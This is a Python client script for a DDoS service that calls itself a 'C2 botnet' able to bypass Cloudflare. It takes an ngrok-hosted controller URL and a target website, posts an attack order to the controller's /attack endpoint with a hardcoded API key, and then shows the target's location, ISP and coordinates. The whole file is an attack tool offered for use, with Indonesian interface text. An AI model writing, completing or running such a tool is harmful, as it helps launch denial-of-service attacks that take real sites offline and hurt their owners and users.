import os
import time
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
from urllib.parse import urlparse, urlunparse, quote
import re
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

def L():
    console.clear()
    console.print(Panel.fit("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Author : Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] Denial Of Service
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] Update : 23 January
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """, style="bold magenta"))
    console.print(Panel.fit("DDOS C2 BOTNET DIZ FLYZE FULL BYPASS CLOUDFLARE", style="bold yellow", padding=(1,2)))

def NU(user_input):
    try:
        user_input = user_input.strip()
        if not re.match(r'^https?://', user_input):
            user_input = 'https://' + user_input
        parsed = urlparse(user_input)
        if not parsed.netloc:
            return None
        return urlunparse(parsed)
    except:
        return None

def validate_api_url(url):
    try:
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        if not any(url.endswith(domain) for domain in ['.ngrok.io', '.ngrok-free.app']):
            return None
        return url
    except:
        return None

def SA(api_url, target):
    try:
        with console.status("[bold green][ ATTACKING ]", spinner="dots12") as status:
            encoded_target = quote(target, safe=':/')
            
            info_response = requests.get(
                f"{api_url}/info?target={encoded_target}",
                timeout=10,
                verify=False
            )
            
            if info_response.status_code != 200:
                console.print(f"[bold red][ ERROR ] : {info_response.json().get('error', 'Gagal mendapatkan info')}")
                return None
                
            info = info_response.json()
            
            response = requests.post(
                f"{api_url}/attack",
                json={"target": target, "apiKey": "TERMUX_KEY"},
                timeout=10,
                verify=False
            )
            
            if response.status_code != 200:
                console.print(f"[bold red][ ERROR ] : {response.json().get('error', 'Gagal attack')}")
                return None
                
            return info
    except requests.exceptions.RequestException as e:
        console.print(f"[bold red][ GAGAL TERHUBUNG ] : {str(e)}")
        return None
    except Exception as e:
        console.print(f"[bold red][ ERROR ] : {str(e)}")
        return None

def SR(info):
    if not info:
        console.print("[bold red][ GAGAL MENDAPATKAN INFORMASI ]")
        return
        
    table = Table.grid(expand=True)
    table.add_column(style="cyan", width=20)
    table.add_column(style="magenta")
    
    try:
        table.add_row("Target", info.get('query', '-'))
        table.add_row("Lokasi", f"{info.get('city', '-')}, {info.get('country', '-')}")
        table.add_row("ISP", info.get('isp', '-'))
        table.add_row("Organisasi", info.get('org', '-'))
        table.add_row("ASN", info.get('as', '-'))
        table.add_row("Zona Waktu", info.get('timezone', '-'))
        table.add_row("Koordinat", f"Lat: {info.get('lat', '-')}, Lon: {info.get('lon', '-')}")
        table.add_row("Status", "[bold green]SUCCESSFULY[/]")
        
        console.print(Panel.fit(
            table,
            title="[bold yellow][ HASIL ATTACKING ]",
            subtitle="[bold green][ TIME ATTACK ] : [ 60 SEC ]",
            style="bold white"
        ))
    except Exception as e:
        console.print(f"[bold red][ ERROR MENAMPILKAN HASIL ] : {str(e)}")

def main():
    try:
        L()
        while True:
            api_url = console.input("[bold white]╔═(api)Dizflyze Streser)\n╚═══➤ ")
            api_url = validate_api_url(api_url)
            if api_url:
                break
            console.print("[bold red][ ERROR ] URL API tidak valid! Gunakan URL ngrok yang benar")
        
        L()
        while True:
            target_input = console.input("[bold white]╔═(link)Dizflyze Streser)\n╚═══➤ ")
            target = NU(target_input)
            if target:
                break
            console.print("[bold red][ ERROR ] URL target tidak valid!")
        
        L()
        with Progress(transient=True) as progress:
            task = progress.add_task("[bold red] [ ATTACKING ]", total=100)
            info = SA(api_url, target)
            
            if info:
                for i in range(100):
                    progress.update(task, advance=1, description=f"[bold yellow][ STATUS ] : ({i+1}%)")
                    time.sleep(0.6)
                L()
                SR(info)
            else:
                console.print("[bold red][ ATTACK GAGAL ]")
    
    except KeyboardInterrupt:
        console.print("\n[bold yellow][ PROGRAM DIHENTIKAN ]")
    except Exception as e:
        console.print(f"[bold red][ ERROR ] : {str(e)}")

if __name__ == "__main__":
    main()
